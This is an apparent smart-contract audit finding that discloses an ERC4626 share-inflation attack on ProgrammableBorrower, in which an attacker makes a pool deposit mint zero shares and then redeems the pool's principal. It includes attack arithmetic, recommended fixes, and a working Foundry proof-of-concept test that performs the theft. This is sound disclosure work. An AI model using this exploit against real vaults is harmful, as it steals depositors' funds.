### Title
Zero-share ERC4626 deposit lets a vault shareholder steal pooled principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower._depositToVault` accepts whatever share amount the configured ERC4626 vault returns, without a minimum-share or post-deposit value check. If an unprivileged vault depositor inflates the share price so `ProgrammableBorrower` receives zero shares, the entire start-epoch deposit can be redeemed by the attacker while `epochStartVaultAssets` still records the deposited principal.

### Finding Description
`onStartEpoch` snapshots `startAssets` before depositing the full on-hand underlying balance into `vault`, then stores that pre-deposit amount as `epochStartVaultAssets`. [1](#0-0) 

The deposit helper forwards `_assetAmount` but only records `epochDepositedToVault` when `_principalAssets != 0`; it never validates `shares`, minimum output, or the post-deposit `convertToAssets` value. [2](#0-1) 

`setVault` accepts any ERC4626 with a matching asset and does not require inflation-resistant share accounting, minimum existing liquidity, or a vault allowlist. [3](#0-2) 

An attacker can therefore own the vault's only share, donate enough underlying to make one share worth more than the upcoming pool deposit, and cause `vault.deposit(poolAssets)` to round the pool's minted shares to zero. The attacker then redeems its one share and receives both the donation and the pool deposit.

Afterward, `_vaultNetInterest` computes `earnedAssets = 0` and `principalAssets = poolAssets`, yielding `vaultLoss = poolAssets`. [4](#0-3) 

However, `totalInterestDueNow` merely floors the result at zero. [5](#0-4) 

In minted-interest programmable-borrower mode, `IdleCDOEpochVariant._stopEpoch` pulls only resolved interest plus pending withdrawals; the missing principal is not burned from the CDO's strategy-token balance or charged as a realized active loss at this point. [6](#0-5) 

Thus the attacker has already extracted the underlying while the CDO continues accounting for the stolen principal as active strategy-token NAV, creating direct theft followed by protocol insolvency when withdrawals require repayment. [7](#0-6) 

### Impact Explanation
For a pool deposit `D`, an attacker controlling the vault's only share can donate `X >= D` so that `D / (X + 1)` rounds to zero shares. The attacker's redemption then returns `X + D`, so the net theft is `D`.

Example with `D = 10,000` tokens: the attacker deposits `1 wei`, donates `10,000` tokens, lets `ProgrammableBorrower` deposit `10,000` tokens for zero shares, and redeems `20,000.000000000000000001` tokens. After recovering its `10,000` token donation and `1 wei` deposit, the attacker's profit is the full `10,000` token pool deposit.

The pool then reports `vaultLoss = 10,000`, but `totalInterestDueNow = 0`, allowing a normal zero-interest stop while the CDO's strategy-token NAV remains overstated by the stolen principal. [4](#0-3) [5](#0-4) 

### Likelihood Explanation
The attack requires programmable-borrower mode and an ERC4626 vault whose conversion can round a deposit to zero or materially below its deposited value. That condition is realistic for unrestricted vaults, newly created vaults, or vaults without effective virtual-share/donation protection, and the attacker needs only the ability to deposit into the vault and transfer the underlying asset directly to it.

No privileged role is required for the malicious actions; the honest owner or manager only performs the scheduled `startEpoch`, which necessarily deposits all on-hand funds without a slippage bound. [8](#0-7) [9](#0-8) 

### Recommendation
Require `vault.deposit` output to satisfy an explicit minimum-share threshold derived from a trusted pre-deposit quote, and revert whenever `_assetAmount > 0` produces zero shares or `convertToAssets(shares)` is below the expected value beyond bounded rounding dust. [2](#0-1) 

Additionally, restrict programmable borrowers to audited inflation-resistant vaults, seed minimum vault liquidity before use, or maintain a vault allowlist rather than accepting every ERC4626 with a matching asset. [3](#0-2)

/// Minimal unrestricted ERC4626-like vault without virtual-share inflation defense.
contract InflatableVault is ERC20 {
  IERC20Detailed public immutable assetToken;
  constructor(address asset_) ERC20("Vault Share", "vSHARE") {
    assetToken = IERC20Detailed(asset_);
  }

  function asset() external view returns (address) { return address(assetToken); }
  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }
  function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? assets : assets * supply / totalAssets();
  }
  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }
  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    shares = convertToShares(assets);
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }
  function redeem(uint256 shares, address receiver, address owner)
    external returns (uint256 assets)
  {
    require(msg.sender == owner, "OWNER");
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
  function withdraw(uint256 assets, address receiver, address owner)
    external returns (uint256 shares)
  {
    require(msg.sender == owner, "OWNER");
    shares = assets * totalSupply() / totalAssets();
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

contract ProgrammableBorrowerShareInflationPoC is Test {
  uint256 constant POOL_ASSETS = 10_000e18;

  function testZeroShareDepositStealsEpochPrincipal() public {
    // Optional fork selection; the arithmetic is deterministic.
    // vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

    MockAsset asset = new MockAsset();
    InflatableVault vault = new InflatableVault(address(asset));
    CDOStub cdo = new CDOStub(address(asset));
    ProgrammableBorrower borrower = new ProgrammableBorrower();
    address attacker = makeAddr("attacker");

    borrower.initialize(
      address(vault),
      address(cdo),
      address(this),
      address(this),
      makeAddr("realBorrower"),
      0
    );

    // Attacker creates the only share and inflates its price above the pool deposit.
    asset.mint(attacker, POOL_ASSETS + 1);
    vm.startPrank(attacker);
    asset.approve(address(vault), 1);
    vault.deposit(1, attacker);
    asset.transfer(address(vault), POOL_ASSETS);
    vm.stopPrank();

    // IdleCDO starts an epoch while ProgrammableBorrower holds POOL_ASSETS cash.
    asset.mint(address(borrower), POOL_ASSETS);
    vm.prank(address(cdo));
    borrower.onStartEpoch(0);

    assertEq(vault.balanceOf(address(borrower)), 0, "pool deposit minted zero shares");
    assertEq(borrower.vaultLoss(), POOL_ASSETS, "missing principal is only marked as loss");
    assertEq(borrower.totalInterestDueNow(), 0, "loss is floored to zero interest");

    vm.prank(attacker);
    uint256 redeemed = vault.redeem(1, attacker, attacker);
    assertEq(redeemed, 2 * POOL_ASSETS + 1, "attacker recovered donation plus pool deposit");
    assertEq(asset.balanceOf(attacker), 2 * POOL_ASSETS + 1, "pool principal stolen");

    vm.prank(address(cdo));
    bool success = borrower.onStopEpoch(0, false);
    assertTrue(success, "stop hook accepts the fully stolen position");
  }
}
